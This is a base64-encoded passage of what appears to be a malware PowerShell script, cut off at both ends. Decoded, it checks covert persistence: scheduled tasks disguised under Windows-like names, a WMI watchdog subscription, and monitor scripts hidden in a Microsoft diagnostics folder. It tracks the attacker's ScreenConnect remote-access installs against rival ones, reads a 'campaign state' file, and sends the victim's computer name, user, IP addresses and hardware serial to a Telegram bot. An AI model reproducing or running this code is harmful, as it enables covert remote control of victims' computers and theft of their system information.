Y2lwYWwuV2luZG93c0J1aWx0SW5Sb2xlXTo6QWRtaW5pc3RyYXRvcikKJGlzU3lzdGVtID0gJHdo
byAtbGlrZSAnKlNZU1RFTSonIC1vciAkd2hvIC1lcSAnTlQgQVVUSE9SSVRZXFNZU1RFTScKCiRt
c2lDYWNoZSA9IEpvaW4tUGF0aCAkV29ya0RpciAncGtnLm1zaScKJG1zaVNpemUgPSBpZiAoVGVz
dC1QYXRoICRtc2lDYWNoZSkgewogICAgJ3swOk4wfSBLQicgLWYgKChHZXQtSXRlbSAkbXNpQ2Fj
aGUgLUZvcmNlKS5MZW5ndGggLyAxS0IpCn0gZWxzZSB7ICdub25lJyB9CgokbW9uUGF0aCA9IEpv
aW4tUGF0aCAkV29ya0RpciAnb3duX21vbi5jbWQnCiRldGxNb24gPSAiJGVudjpQcm9ncmFtRGF0
YVxNaWNyb3NvZnRcRGlhZ25vc2lzXFN0YXRlXC5ldGxjYWNoZVxldGxfbW9uLmNtZCIKJGhhc01v
biA9IFRlc3QtUGF0aCAkbW9uUGF0aAokaGFzRXRsID0gVGVzdC1QYXRoICRldGxNb24KCiMgVDEw
OiBvbi1kaXNrIHBheWxvYWQgYnVpbGQgbWFya2VycyAtPiBldmVyeSByZXBvcnQgcHJvdmVzIGV4
YWN0bHkgd2hhdCBpcyBpbnN0YWxsZWQKZnVuY3Rpb24gR2V0LVBheWxvYWRCdWlsZChbc3RyaW5n
XSRmaWxlKSB7CiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRmaWxlKSkgeyByZXR1cm4gJ21pc3Np
bmcnIH0KICAgIGZvcmVhY2ggKCRsIGluIChHZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGZpbGUg
LVRvdGFsQ291bnQgOCAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpKSB7CiAg
ICAgICAgaWYgKCRsIC1tYXRjaCAnQlVJTERccytcZHs4fShbQS1aXStcZCspJykgeyByZXR1cm4g
JG1hdGNoZXNbMV0gfQogICAgfQogICAgcmV0dXJuICc/Jwp9CiRiTW9uID0gR2V0LVBheWxvYWRC
dWlsZCAoSm9pbi1QYXRoICRXb3JrRGlyICdvd25fbW9uLmNtZCcpCiRiU2VjID0gR2V0LVBheWxv
YWRCdWlsZCAoSm9pbi1QYXRoICRXb3JrRGlyICdvd25fc2VjdXJlLmNtZCcpCiRiVGdyID0gR2V0
LVBheWxvYWRCdWlsZCAoSm9pbi1QYXRoICRXb3JrRGlyICd0Z19yZXBvcnQucHMxJykKJGJMaWIg
PSBHZXQtUGF5bG9hZEJ1aWxkIChKb2luLVBhdGggJFdvcmtEaXIgJ293bl9saWIucHMxJykKCiMg
cGVyLWhvc3QgaWRlbnRpdHk6IGV4cGVjdGVkIHRhc2sgbmFtZXMgY29tZSBmcm9tIGlkZW50aXR5
LmNmZyB3aGVuIHByZXNlbnQKJGlkQ2ZnID0gSm9pbi1QYXRoICRXb3JrRGlyICdpZGVudGl0eS5j
ZmcnCiRpZE1hcCA9IEB7fQppZiAoVGVzdC1QYXRoICRpZENmZykgewogICAgR2V0LUNvbnRlbnQg
LUxpdGVyYWxQYXRoICRpZENmZyB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICBpZiAoJF8gLW1h
dGNoICdeXHMqKFtBLVpfXSspXHMqPVxzKiguKz8pXHMqJCcpIHsgJGlkTWFwWyRtYXRjaGVzWzFd
XSA9ICRtYXRjaGVzWzJdIH0KICAgIH0KfQokZXhwZWN0ZWRUYXNrcyA9IEAoCiAgICBAeyBOYW1l
ID0gJChpZiAoJGlkTWFwLlRBU0tfQSkgeyAkaWRNYXAuVEFTS19BIH0gZWxzZSB7ICdXZXJRdWV1
ZVN5bmMnIH0pOyBSb2xlID0gInRpY2sgJCgkaWRNYXAuTU9fQSltIChjaGFpbjEpIiB9LAogICAg
QHsgTmFtZSA9ICQoaWYgKCRpZE1hcC5UQVNLX0IpIHsgJGlkTWFwLlRBU0tfQiB9IGVsc2UgeyAn
UGxhU2VydmVySGVhbHRoJyB9KTsgUm9sZSA9ICJiYWNrdXAgJCgkaWRNYXAuTU9fQiltIChjaGFp
bjEpIiB9LAogICAgQHsgTmFtZSA9ICQoaWYgKCRpZE1hcC5UQVNLX0MpIHsgJGlkTWFwLlRBU0tf
QyB9IGVsc2UgeyAnV2RpSG9zdFByb3h5JyB9KTsgUm9sZSA9ICdPTlNUQVJUIChjaGFpbjEpJyB9
LAogICAgQHsgTmFtZSA9ICQoaWYgKCRpZE1hcC5UQVNLX0QpIHsgJGlkTWFwLlRBU0tfRCB9IGVs
c2UgeyAnVGNwSXBDb25mbGljdFJlcycgfSk7IFJvbGUgPSAnT05MT0dPTiAoY2hhaW4xKScgfQop
CiMgY2hhaW4gMjogV01JIHdhdGNoZG9nIHN1YnNjcmlwdGlvbgokd21pQyA9IEdldC1XbWlPYmpl
Y3QgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgQ29tbWFuZExpbmVFdmVudENv
bnN1bWVyIC1GaWx0ZXIgIk5hbWU9J1d1Y2FjaGVXYXRjaGRvZ0MnIiAtRXJyb3JBY3Rpb24gU2ls
ZW50bHlDb250aW51ZQokZXhwZWN0ZWRUYXNrcyArPSBAeyBOYW1lID0gJ1xXTUlcV3VjYWNoZVdh
dGNoZG9nQyc7IFJvbGUgPSAndGltZXIgM20gKGNoYWluMiknOyBXbWkgPSAoJG51bGwgLW5lICR3
bWlDKSB9CgokdGFza0xpbmVzID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJp
Yy5MaXN0W3N0cmluZ10KJHRhc2tPayA9IDAKJHRhc2tCYWQgPSAwCmZvcmVhY2ggKCR0IGluICRl
eHBlY3RlZFRhc2tzKSB7CiAgICBpZiAoJHQuQ29udGFpbnNLZXkoJ1dtaScpKSB7CiAgICAgICAg
aWYgKCR0LldtaSkgeyAkdGFza09rKys7ICRtYXJrID0gJ09LJyB9IGVsc2UgeyAkdGFza0JhZCsr
OyAkbWFyayA9ICdNSVNTSU5HJyB9CiAgICAgICAgW3ZvaWRdJHRhc2tMaW5lcy5BZGQoKCctIFt7
MH1dIDxjb2RlPnsxfTwvY29kZT4gLSB7Mn0nIC1mICRtYXJrLCAoRXNjICR0Lk5hbWUpLCAoRXNj
ICR0LlJvbGUpKSkKICAgICAgICBjb250aW51ZQogICAgfQogICAgJGggPSBHZXQtVGFza0hlYWx0
aCAkdC5OYW1lCiAgICBpZiAoJGguUHJlc2VudCAtYW5kICRoLkhlYWx0aHkpIHsKICAgICAgICAk
dGFza09rKysKICAgICAgICAkbWFyayA9ICdPSycKICAgIH0gZWxzZWlmICgkaC5QcmVzZW50IC1h
bmQgLW5vdCAkaC5PdXJzKSB7CiAgICAgICAgJHRhc2tCYWQrKwogICAgICAgICRtYXJrID0gJ05P
VF9PVVJTJwogICAgfSBlbHNlaWYgKCRoLlByZXNlbnQpIHsKICAgICAgICAkdGFza0JhZCsrCiAg
ICAgICAgJG1hcmsgPSAnV0VBSycKICAgIH0gZWxzZSB7CiAgICAgICAgJHRhc2tCYWQrKwogICAg
ICAgICRtYXJrID0gJ01JU1NJTkcnCiAgICB9CiAgICAkZXh0cmEgPSAnJwogICAgaWYgKCRoLlBy
ZXNlbnQpIHsKICAgICAgICAkYml0cyA9IEAoKQogICAgICAgIGlmICgkaC5TdGF0dXMpIHsgJGJp
dHMgKz0gJGguU3RhdHVzIH0KICAgICAgICBpZiAoJGguUmVzdWx0IC1uZSAnJyAtYW5kICRoLlJl
c3VsdCAtbmUgJzAnKSB7ICRiaXRzICs9ICgiTGFzdFJlc3VsdD0iICsgJGguUmVzdWx0KSB9CiAg
ICAgICAgaWYgKCRiaXRzLkNvdW50KSB7ICRleHRyYSA9ICcgKCcgKyAoJGJpdHMgLWpvaW4gJywg
JykgKyAnKScgfQogICAgfQogICAgW3ZvaWRdJHRhc2tMaW5lcy5BZGQoKCctIFt7MH1dIDxjb2Rl
PnsxfTwvY29kZT4gLSB7Mn17M30nIC1mICRtYXJrLCAoRXNjICR0Lk5hbWUpLCAoRXNjICR0LlJv
bGUpLCAoRXNjICRleHRyYSkpKQp9CgokcHJpbUxpbmUgPSBHZXQtU3ZjTGluZSAkcHJpbQokYWx0
TGluZSA9IEdldC1TdmNMaW5lICRhbHQKJHByaW1PayA9ICRwcmltTGluZSAtbGlrZSAnUnVubmlu
ZyonCiRkZXBsb3lPayA9ICRwcmltT2sgLWFuZCAoJHRhc2tPayAtZ2UgMykgLWFuZCAkaGFzTW9u
CgokZW1vamlNYXAgPSBAewogICAgT0sgICAgICAgPSBbc3RyaW5nXShbY2hhcl0weDI3MDUpCiAg
ICBET1dOICAgICA9IChbc3RyaW5nXVtjaGFyXTo6Q29udmVydEZyb21VdGYzMigweDFGNkE4KSkK
ICAgIFJFU1RPUkVEID0gKFtzdHJpbmddW2NoYXJdOjpDb252ZXJ0RnJvbVV0ZjMyKDB4MUY3RTIp
KQogICAgRkFJTCAgICAgPSBbc3RyaW5nXShbY2hhcl0weDI3NEMpCiAgICBGT1JDRSAgICA9IFtz
dHJpbmddKFtjaGFyXTB4MjZBMSkKICAgIERFUExPWSAgID0gKFtzdHJpbmddW2NoYXJdOjpDb252
ZXJ0RnJvbVV0ZjMyKDB4MUY2ODApKQogICAgSEIgICAgICAgPSAoW3N0cmluZ11bY2hhcl06OkNv
bnZlcnRGcm9tVXRmMzIoMHgxRjRFMSkpCn0KJGtleSA9ICRTdGF0ZS5Ub1VwcGVySW52YXJpYW50
KCkKJGVtb2ppID0gaWYgKCRlbW9qaU1hcC5Db250YWluc0tleSgka2V5KSkgeyAkZW1vamlNYXBb
JGtleV0gfSBlbHNlIHsgKFtzdHJpbmddW2NoYXJdOjpDb252ZXJ0RnJvbVV0ZjMyKDB4MUY0RjEp
KSB9CgokdGl0bGUgPSBzd2l0Y2ggKCRrZXkpIHsKICAgICdPSycgeyAnUHJpbWFyeSBoZWFsdGh5
JyB9CiAgICAnRE9XTicgeyAnUHJpbWFyeSBET1dOIC0gaGVhbGluZycgfQogICAgJ1JFU1RPUkVE
JyB7ICdQcmltYXJ5IFJFU1RPUkVEJyB9CiAgICAnRkFJTCcgeyAnSGVhbCBGQUlMRUQnIH0KICAg
ICdGT1JDRScgeyAnRm9yY2VkIHJlaW5zdGFsbCcgfQogICAgJ0RFUExPWScgeyBpZiAoJGRlcGxv
eU9rKSB7ICdGSVJTVCBERVBMT1kgT0snIH0gZWxzZSB7ICdGSVJTVCBERVBMT1kgLSBDSEVDSyBO
RUVERUQnIH0gfQogICAgJ0hCJyB7ICdob3VybHkgZGlnZXN0JyB9CiAgICBkZWZhdWx0IHsgIlN0
YXRlOiAkU3RhdGUiIH0KfQoKJHRyYW5zID0gaWYgKCRPbGRTdGF0ZSkgeyAiJE9sZFN0YXRlIC0+
ICRTdGF0ZSIgfSBlbHNlIHsgJFN0YXRlIH0KJHNjTGlzdCA9IEdldC1TY0luc3RhbGxzCiRybW1I
aXRzID0gR2V0LVJtbUhpdHMKaWYgKCRybW1IaXRzLkNvdW50IC1lcSAwKSB7IFt2b2lkXSRybW1I
aXRzLkFkZCgnLSAobm9uZSBkZXRlY3RlZCknKSB9CgokcHViID0gR2V0LVB1YmxpY0lwCiRsYW4g
PSBHZXQtTG9jYWxJcHMKJG5vdyA9IEdldC1EYXRlIC1Gb3JtYXQgJ3l5eXktTU0tZGQgSEg6bW06
c3Mgenp6JwokdXB0aW1lID0gJ24vYScKdHJ5IHsKICAgICRib290ID0gKEdldC1DaW1JbnN0YW5j
ZSBXaW4zMl9PcGVyYXRpbmdTeXN0ZW0pLkxhc3RCb290VXBUaW1lCiAgICAkdXB0aW1lID0gJ3sw
OmRkfWQgezA6aGh9aCB7MDptbX1tJyAtZiAoKEdldC1EYXRlKSAtICRib290KQp9IGNhdGNoIHt9
CgojIGNhbXBhaWduIHN0YXRlIGZpbGUgKHdyaXR0ZW4gYnkgb3duX2xpYi5wczEgc3RhdGUgYWN0
aW9uKQokc3RhdGVMaW5lID0gJ24vYScKJHN0YXRlT2JqID0gJG51bGwKJHN0YXRlUGF0aDIgPSBK
b2luLVBhdGggJFdvcmtEaXIgJ3N0YXRlLmpzb24nCmlmIChUZXN0LVBhdGggJHN0YXRlUGF0aDIp
IHsKICAgICRyYXdTdGF0ZSA9IChHZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJHN0YXRlUGF0aDIg
LVJhdykuVHJpbSgpCiAgICB0cnkgewogICAgICAgICRzdGF0ZU9iaiA9ICRyYXdTdGF0ZSB8IENv
bnZlcnRGcm9tLUpzb24KICAgICAgICAkZm9yZWlnbkNzdiA9IGlmICgkc3RhdGVPYmouZm9yZWln
bikgeyAoJHN0YXRlT2JqLmZvcmVpZ24gLWpvaW4gJywnKSB9IGVsc2UgeyAnLScgfQogICAgICAg
ICRzdGF0ZUxpbmUgPSAicHJpbT0kKCRzdGF0ZU9iai5wcmltKSBhbHQ9JCgkc3RhdGVPYmouYWx0
KSBmb3JlaWduPVskZm9yZWlnbkNzdl0gdGFza3M9JCgkc3RhdGVPYmoudGFza3NPaykvJCgkc3Rh
dGVPYmoudGFza3NUb3RhbCkgd2Q9JCgkc3RhdGVPYmoud2F0Y2hkb2cpIGhlYWxzPSQoJHN0YXRl
T2JqLmluc3RhbGxDb3VudCkiCiAgICB9IGNhdGNoIHsgJHN0YXRlTGluZSA9ICRyYXdTdGF0ZSB9
Cn0KCiRkZXBsb3lCbG9jayA9ICcnCmlmICgka2V5IC1lcSAnREVQTE9ZJykgewogICAgJHZlcmRp
Y3QgPSBpZiAoJGRlcGxveU9rKSB7ICdERVBMT1lFRCAvIEhFQUxUSFknIH0gZWxzZSB7ICdERVBM
T1lFRCBCVVQgSU5DT01QTEVURScgfQogICAgJGZvcmVpZ24gPSBAKEdldC1DaGlsZEl0ZW0gLVBh
dGggIiR7ZW52OlByb2dyYW1GaWxlc31cU2NyZWVuQ29ubmVjdCBDbGllbnQqIiwiJHtlbnY6UHJv
Z3JhbUZpbGVzKHg4Nil9XFNjcmVlbkNvbm5lY3QgQ2xpZW50KiIgLURpcmVjdG9yeSAtRXJyb3JB
Y3Rpb24gU2lsZW50bHlDb250aW51ZSB8CiAgICAgICAgV2hlcmUtT2JqZWN0IHsgJF8uTmFtZSAt
bm90bWF0Y2ggKCI1ZjYwMTA1Nzk4NTJlNTA3fGY4NjFjODE0MGQ0NTM0Mjd8ezB9IiAtZiAoR2V0
LUdyeXhhS2VlcEZwKSkgfSkKICAgICRkaWFnTGluZXMgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xs
ZWN0aW9ucy5HZW5lcmljLkxpc3Rbc3RyaW5nXQogICAgJGJvb3RQYXRoID0gSm9pbi1QYXRoICRX
b3JrRGlyICdib290LmVycicKICAgIGlmIChUZXN0LVBhdGggJGJvb3RQYXRoKSB7CiAgICAgICAg
JGludGVyZXN0aW5nID0gQCgKICAgICAgICAgICAgJ21zaV8nLCAnZmV0Y2hfJywgJ3ByaW1hcnlf
JywgJ251a2VfJywgJ21zaV90b28nLCAnbXNpX2ZldGNoJywgJ21zaV9leGl0JywKICAgICAgICAg
ICAgJ21zaV91bmF2YWlsYWJsZScsICdzZWN1cmVfJywgJ2dvXycsICdleHRlcm1pbmF0ZV8nLCAn
aWRlbnRpdHlfJywKICAgICAgICAgICAgJ2NyZWF0ZV90YXNrJywgJ3ZlcmlmeV90YXNrJywgJ29y
cGhhbl8nLCAnc3RhbGVfJywgJ3Bvc3RpbnN0YWxsJywgJ2FsdF8nCiAgICAgICAgKQogICAgICAg
IEdldC1Db250ZW50IC1MaXRlcmFsUGF0aCAkYm9vdFBhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5
Q29udGludWUgfAogICAgICAgICAgICBXaGVyZS1PYmplY3QgewogICAgICAgICAgICAgICAgJGxp
bmUgPSAkXwogICAgICAgICAgICAgICAgZm9yZWFjaCAoJHQgaW4gJGludGVyZXN0aW5nKSB7IGlm
ICgkbGluZSAtbGlrZSAiKiR0KiIpIHsgcmV0dXJuICR0cnVlIH0gfQogICAgICAgICAgICAgICAg
JGZhbHNlCiAgICAgICAgICAgIH0gfAogICAgICAgICAgICBTZWxlY3QtT2JqZWN0IC1MYXN0IDI2
IHwKICAgICAgICAgICAgRm9yRWFjaC1PYmplY3QgeyBbdm9pZF0kZGlhZ0xpbmVzLkFkZCgoJy0g
PGNvZGU+ezB9PC9jb2RlPicgLWYgKEVzYyAoJF8gLXJlcGxhY2UgJ1teXHgyMC1ceDdFXScsICc/
JykpKSkgfQogICAgfQogICAgaWYgKCRkaWFnTGluZXMuQ291bnQgLWVxIDApIHsgW3ZvaWRdJGRp
YWdMaW5lcy5BZGQoJy0gKG5vIGluc3RhbGwvbnVrZSBtYXJrZXJzIGluIGJvb3QuZXJyKScpIH0K
ICAgICRkZXBsb3lCbG9jayA9IEAiCgo8Yj5EZXBsb3kgdmVyZGljdDwvYj4KLSBSZXN1bHQ6IDxi
PiQoRXNjICR2ZXJkaWN0KTwvYj4KLSBQcmltYXJ5IFJ1bm5pbmc6ICQoaWYgKCRwcmltT2spIHsg
J1lFUycgfSBlbHNlIHsgJ05PJyB9KQotIE1vbml0b3Igc2NyaXB0ICgud3VjYWNoZVxvd25fbW9u
LmNtZCk6ICQoaWYgKCRoYXNNb24pIHsgJ1lFUycgfSBlbHNlIHsgJ05PJyB9KQotIEJhY2t1cCBt
b24gKC5ldGxjYWNoZVxldGxfbW9uLmNtZCk6ICQoaWYgKCRoYXNFdGwpIHsgJ1lFUycgfSBlbHNl
IHsgJ05PJyB9KQotIFBlcnNpc3QgdGFza3MgT0s6ICR0YXNrT2sgLyAkKCRleHBlY3RlZFRhc2tz
LkNvdW50KSAoYmFkL21pc3Npbmc6ICR0YXNrQmFkKQotIE1TSSBjYWNoZTogJChFc2MgJG1zaVNp
emUpCi0gRm9yZWlnbiBTQyBmb2xkZXJzIGxlZnQ6ICQoJGZvcmVpZ24uQ291bnQpCi0gTm90ZTog
TGFzdFJlc3VsdCAyNjcwMTEgPSB0YXNrIG5vdCB5ZXQgcnVuIChub3JtYWwgcmlnaHQgYWZ0ZXIg
Y3JlYXRlKQoKPGI+RGVwbG95IGxvZyBtYXJrZXJzPC9iPgokKCRkaWFnTGluZXMgLWpvaW4gImBu
IikKIkAKfQoKJHRleHQgPSBAIgokZW1vamkgPGI+U0MgTW9uaXRvciAtICQoRXNjICR0aXRsZSk8
L2I+Cgo8Yj5FdmVudDwvYj4KLSBTdW1tYXJ5OiAkKEVzYyAkU3VtbWFyeSkKLSBUcmFuc2l0aW9u
OiA8Y29kZT4kKEVzYyAkdHJhbnMpPC9jb2RlPgotIFdoZW46ICQoRXNjICRub3cpCi0gU291cmNl
IGJ1aWxkOiA8Y29kZT4kKEVzYyAkQnVpbGQpPC9jb2RlPgokZGVwbG95QmxvY2sKCjxiPkhvc3Q8
L2I+Ci0gQ29tcHV0ZXI6IDxjb2RlPiQoRXNjICRlbnY6Q09NUFVURVJOQU1FKTwvY29kZT4KLSBV
c2VyOiA8Y29kZT4kKEVzYyAkd2hvKTwvY29kZT4KLSBFbGV2YXRlZDogJGVsZXYgfCBTWVNURU06
ICRpc1N5c3RlbQotIERvbWFpbi9Xb3JrZ3JvdXA6ICQoRXNjICRvcy5Eb21haW4pCgo8Yj5OZXR3
b3JrPC9iPgotIExBTiBJUHM6IDxjb2RlPiQoRXNjICRsYW4pPC9jb2RlPgotIFB1YmxpYyBJUDog
PGNvZGU+JChFc2MgJHB1Yik8L2NvZGU+Cgo8Yj5PUyAvIEhhcmR3YXJlPC9iPgotIE9TOiAkKEVz
YyAkb3MuQ2FwdGlvbikKLSBWZXJzaW9uOiAkKEVzYyAkb3MuVmVyc2lvbikgKGJ1aWxkICQoRXNj
ICRvcy5CdWlsZCkpICQoRXNjICRvcy5BcmNoKQotIEluc3RhbGw6ICQoRXNjICRvcy5JbnN0YWxs
RGF0ZSkgfCBMYXN0IGJvb3Q6ICQoRXNjICRvcy5MYXN0Qm9vdCkKLSBVcHRpbWU6ICQoRXNjICR1
cHRpbWUpCi0gQ1BVOiAkKEVzYyAkb3MuQ1BVKQotIEhhcmR3YXJlOiAkKEVzYyAkb3MuTWFudWZh
Y3R1cmVyKSAkKEVzYyAkb3MuTW9kZWwpCi0gU2VyaWFsOiA8Y29kZT4kKEVzYyAkb3MuU2VyaWFs
KTwvY29kZT4KLSBSQU06ICQoJG9zLlRvdGFsUkFNX0dCKSBHQgotIERpc2sgQzogJCgkb3MuRGlz
a0ZyZWVfR0IpIEdCIGZyZWUgLyAkKCRvcy5EaXNrU2l6ZV9HQikgR0IKCjxiPlNjcmVlbkNvbm5l
Y3QgKGFsbCk8L2I+Ci0gU2V2cnogPGNvZGU+NWY2MDEwNTc5ODUyZTUwNzwvY29kZT46ICQoRXNj
ICRwcmltTGluZSkKLSBBbHQgPGNvZGU+Zjg2MWM4MTQwZDQ1MzQyNzwvY29kZT46ICQoRXNjICRh
bHRMaW5lKQotIEdyeXhhIDxjb2RlPiQoRXNjIChHZXQtR3J5eGFLZWVwRnApKTwvY29kZT46ICQo
RXNjIChHZXQtU3ZjTGluZSAoIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICh7MH0pIiAtZiAoR2V0LUdy
eXhhS2VlcEZwKSkpKQokKCRzY0xpc3QgLWpvaW4gImBuIikKCjxiPk90aGVyIFJNTSAvIHJlbW90
ZSB0b29sczwvYj4KJCgkcm1tSGl0cyAtam9pbiAiYG4iKQoKPGI+UGVyc2lzdCB0YXNrcyAoZXhw
ZWN0ZWQpPC9iPgokKCR0YXNrTGluZXMgLWpvaW4gImBuIikKCjxiPkNhY2hlPC9iPgotIE1TSSBj
YWNoZTogJChFc2MgJG1zaVNpemUpCi0gV29ya0RpcjogPGNvZGU+JChFc2MgJFdvcmtEaXIpPC9j
b2RlPgoKPGI+UGF5bG9hZCBidWlsZHMgKGluc3RhbGxlZCBvbiB0aGlzIGhvc3QpPC9iPgotIDxj
b2RlPk1PTj0kYk1vbiB8IFNFQz0kYlNlYyB8IFRHUj0kYlRnciB8IExJQj0kYkxpYjwvY29kZT4K
CjxiPkNhbXBhaWduIHN0YXRlPC9iPgotIDxjb2RlPiQoRXNjICRzdGF0ZUxpbmUpPC9jb2RlPgoK
PGk+Qm90OiBAbm9idWRkeXJtbUJvdCB8IFRHX1JFUE9SVCAkYlRncjwvaT4KIkAKCiMgY29tcGFj
dCBkaWdlc3QgbW9kZTogb25lIHNob3J0IGxpbmUsIEhUTUwtZnJlZSAoaG91cmx5IGhlYXJ0YmVh
dCkKaWYgKCRNb2RlIC1lcSAnY29tcGFjdCcpIHsKICAgICRmb3JlaWduTiA9IDAKICAgIGlmICgk
c3RhdGVPYmogLWFuZCAkc3RhdGVPYmouZm9yZWlnbikgeyAkZm9yZWlnbk4gPSBAKCRzdGF0ZU9i
ai5mb3JlaWduKS5Db3VudCB9CiAgICAkbXNpU2hvcnQgPSBpZiAoVGVzdC1QYXRoICRtc2lDYWNo
ZSkgeyAnezA6TjB9S0InIC1mICgoR2V0LUl0ZW0gJG1zaUNhY2hlIC1Gb3JjZSkuTGVuZ3RoIC8g
MUtCKSB9IGVsc2UgeyAnMCcgfQogICAgJHByaW1TaG9ydCA9IGlmICgkcHJpbU9rKSB7ICdPSycg
fSBlbHNlIHsgJ0RPV04nIH0KICAgICRhbHRTaG9ydCA9IGlmICgkYWx0TGluZSAtbGlrZSAnUnVu
bmluZyonKSB7ICdPSycgfSBlbHNlIHsgJy0nIH0KICAgICRncnl4YUxpbmUgPSBHZXQtU3ZjTGlu
ZSAoIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICh7MH0pIiAtZiAoR2V0LUdyeXhhS2VlcEZwKSkKICAg
ICRncnl4YVNob3J0ID0gaWYgKCRncnl4YUxpbmUgLWxpa2UgJ1J1bm5pbmcqJykgeyAnT0snIH0g
ZWxzZSB7ICctJyB9CiAgICAkdGV4dCA9ICIkZW1vamkgU0NEfCQoJGVudjpDT01QVVRFUk5BTUUp
fHNldj0kcHJpbVNob3J0fGdyeT0kZ3J5eGFTaG9ydHxhbHQ9JGFsdFNob3J0fGY9JGZvcmVpZ25O
fHQ9JHRhc2tPay81fGI9JEJ1aWxkIgp9CgppZiAoJHRleHQuTGVuZ3RoIC1ndCAzODAwKSB7CiAg
ICAkcm1tSGl0cyA9IEAoKCRybW1IaXRzIHwgU2VsZWN0LU9iamVjdCAtRmlyc3QgMTIpKSArICgn
LSAuLi4gKHswfSBtb3JlKScgLWYgKCRybW1IaXRzLkNvdW50IC0gMTIpKQogICAgJHNjTGlzdCA9
IEAoKCRzY0xpc3QgfCBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxNCkpICsgKCctIC4uLiAoezB9IG1v
cmUpJyAtZiAoJHNjTGlzdC5Db3VudCAtIDE0KSkKICAgICR0ZXh0ID0gJHRleHQuU3Vic3RyaW5n
KDAsIDM4MDApICsgImBuYG48aT5UUlVOQ0FURUQgKFRlbGVncmFtIDQwOTYgbGltaXQpPC9pPiIK
fQoKJGxvZyA9IEpvaW4tUGF0aCAkV29ya0RpciAnYm9vdC5lcnInCmZ1bmN0aW9uIFNlbmQtVGco
W3N0cmluZ10kbXNnLCBbc3RyaW5nXSRtb2RlKSB7CiAgICAkcGF5bG9hZCA9IEB7CiAgICAgICAg
Y2hhdF9pZCAgICAgICAgICAgICAgICAgID0gJGNmZy5DSEFUX0lECiAgICAgICAgdGV4dCAgICAg
ICAgICAgICAgICAgICAgID0gJG1zZwogICAgICAgIGRpc2FibGVfd2ViX3BhZ2VfcHJldmlldyA9
ICR0cnVlCiAgICB9CiAgICBpZiAoJG1vZGUpIHsgJHBheWxvYWQucGFyc2VfbW9kZSA9ICRtb2Rl
IH0KICAgICRqc29uID0gJHBheWxvYWQgfCBDb252ZXJ0VG8tSnNvbiAtQ29tcHJlc3MgLURlcHRo
IDUKICAgICRieXRlcyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJGpz
b24pCiAgICBJbnZva2UtUmVzdE1ldGhvZCAtVXJpICgiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3Jn
L2JvdCQoJGNmZy5CT1RfVE9LRU4pL3NlbmRNZXNzYWdlIikgYAogICAgICAgIC1NZXRob2QgUG9z
dCAtQm9keSAkYnl0ZXMgLUNvbnRlbnRUeXBlICdhcHBsaWNhdGlvbi9qc29uOyBjaGFyc2V0PXV0
Zi04JyB8IE91dC1OdWxsCn0KCmZ1bmN0aW9uIFNlbmQtVGdTYWZlKFtzdHJpbmddJG1zZywgW3N0
cmluZ10kbW9kZSkgewogICAgJHRvU2VuZCA9ICRtc2cKICAgIHRyeSB7CiAgICAgICAgU2VuZC1U
ZyAtbXNnICR0b1NlbmQgLW1vZGUgJG1vZGUKICAgICAgICByZXR1cm4gJHRydWUKICAgIH0gY2F0
Y2ggewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIFNlbmQtVGcgLW1zZyAoJHRvU2VuZC5TdWJz
dHJpbmcoMCwgMzAwMCkgKyAiYG48aT5UUlVOQ0FURUQ8L2k+IikgLW1vZGUgJG1vZGUKICAgICAg
ICAgICAgcmV0dXJuICR0cnVlCiAgICAgICAgfSBjYXRjaCB7CiAgICAgICAgICAgIHJldHVybiAk
ZmFsc2UKICAgICAgICB9CiAgICB9Cn0KCnRyeSB7CiAgICBpZiAoU2VuZC1UZ1NhZmUgLW1zZyAk
dGV4dCAtbW9kZSAnSFRNTCcpIHsKICAgICAgICBBZGQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGxv
ZyAtVmFsdWUgJ3RnX3NlbnRfcmljaCcgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAg
IH0gZWxzZSB7CiAgICAgICAgdGhyb3cgJ2h0bWxfZmFpbGVkJwogICAgfQogICAgaWYgKCRrZXkg
LWVxICdERVBMT1knKSB7CiAgICAgICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZh
bHVlICgidGdfZGVwbG95X29rPSIgKyAkZGVwbG95T2spIC1FcnJvckFjdGlvbiBTaWxlbnRseUNv
bnRpbnVlCiAgICAgICAgU2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoIChKb2luLVBhdGggJFdvcmtE
aXIgJ2RlcGxveV90Zy5mbGFnJykgLVZhbHVlIChHZXQtRGF0ZSAtRm9ybWF0ICdvJykgLUVycm9y
QWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgIH0KfSBjYXRjaCB7CiAgICB0cnkgewogICAgICAg
ICRwbGFpbiA9IFtyZWdleF06OlJlcGxhY2UoJHRleHQsICc8W14+XSs+JywgJycpCiAgICAgICAg
JHBsYWluID0gW1N5c3RlbS5OZXQuV2ViVXRpbGl0eV06Okh0bWxEZWNvZGUoJHBsYWluKQogICAg
ICAgIGlmICgkcGxhaW4uTGVuZ3RoIC1ndCAzNTAwKSB7ICRwbGFpbiA9ICRwbGFpbi5TdWJzdHJp
bmcoMCwgMzUwMCkgKyAiYG5UUlVOQ0FURUQiIH0KICAgICAgICBTZW5kLVRnU2FmZSAtbXNnICRw
bGFpbiAtbW9kZSAnJyB8IE91dC1OdWxsCiAgICAgICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRo
ICRsb2cgLVZhbHVlICd0Z19zZW50X3BsYWluJyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51
